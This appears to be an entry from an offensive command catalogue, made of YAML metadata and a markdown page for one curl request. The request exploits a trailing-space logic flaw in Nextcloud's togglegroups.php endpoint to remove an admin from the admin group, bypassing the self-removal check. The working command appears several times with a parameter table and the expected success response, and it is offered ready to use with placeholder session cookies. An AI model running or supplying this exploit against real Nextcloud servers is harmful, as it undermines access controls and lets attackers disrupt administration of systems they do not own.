---
data: >-
  curl -X POST
  'http://target-nextcloud/index.php/settings/ajax/togglegroups.php' -H
  'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  oc_session=your_session; requesttoken=your_token' -d
  'username=admin&group=admin '
tags:
  - nextcloud
  - http-request
  - bypass
  - logic-bypass
type: command
output: >-
  {"data":{"username":"admin","action":"remove","groupname":"admin
  "},"status":"success"}
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.566Z'
id: 862554a7-7901-478a-b7e2-5d31df32b13e
verified: false
validated: true
submitted: true
---
# curl-nextcloud-admin-removal-bypass

## Command

```bash
curl -X POST 'http://target-nextcloud/index.php/settings/ajax/togglegroups.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: oc_session=your_session; requesttoken=your_token' -d 'username=admin&group=admin '
```

## Description

This command exploits the trailing space in the group parameter to bypass the admin self-removal check, successfully removing the admin from the admin group.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `-H 'Cookie: ...'` | Provides authentication session and token | Yes |
| `-d 'username=admin&group=admin '` | Targets admin with trailing space in group | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target-nextcloud/index.php/settings/ajax/togglegroups.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: oc_session=your_session; requesttoken=your_token' -d 'username=admin&group=admin '
```

### Advanced Usage

Use `-v` to inspect how the space affects processing.

## Expected Output

{"data":{"username":"admin","action":"remove","groupname":"admin "},"status":"success"}

## Related

- [[Related Procedure: Bypass-Nextcloud-Admin-Self-Removal-with-Trailing-Space]]
